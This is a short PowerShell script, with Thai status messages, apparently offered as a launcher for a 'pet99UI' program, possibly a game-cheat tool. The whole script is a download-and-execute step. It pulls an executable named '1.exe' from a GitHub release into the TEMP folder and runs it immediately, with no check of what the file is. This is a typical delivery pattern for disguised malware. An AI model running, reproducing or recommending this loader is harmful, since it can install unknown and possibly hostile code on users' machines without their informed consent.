[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$downloadUrl = "https://github.com/Oven095/pet99UI/releases/download/v1.0.0/1.exe"
$savePath = "$env:TEMP\1.exe"

Write-Host "[+] กำลังเริ่มดาวน์โหลดไฟล์โปรแกรม..." -ForegroundColor Cyan

try {
    Invoke-WebRequest -Uri $downloadUrl -OutFile $savePath -UseBasicParsing
    Write-Host "[+] ดาวน์โหลดสำเร็จเรียบร้อย!" -ForegroundColor Green
    
    Write-Host "[+] กำลังเปิดใช้งานโปรแกรม..." -ForegroundColor Yellow
    Start-Process -FilePath $savePath
}
catch {
    Write-Host "[-] เกิดข้อผิดพลาดในการดาวน์โหลด: $_" -ForegroundColor Red
}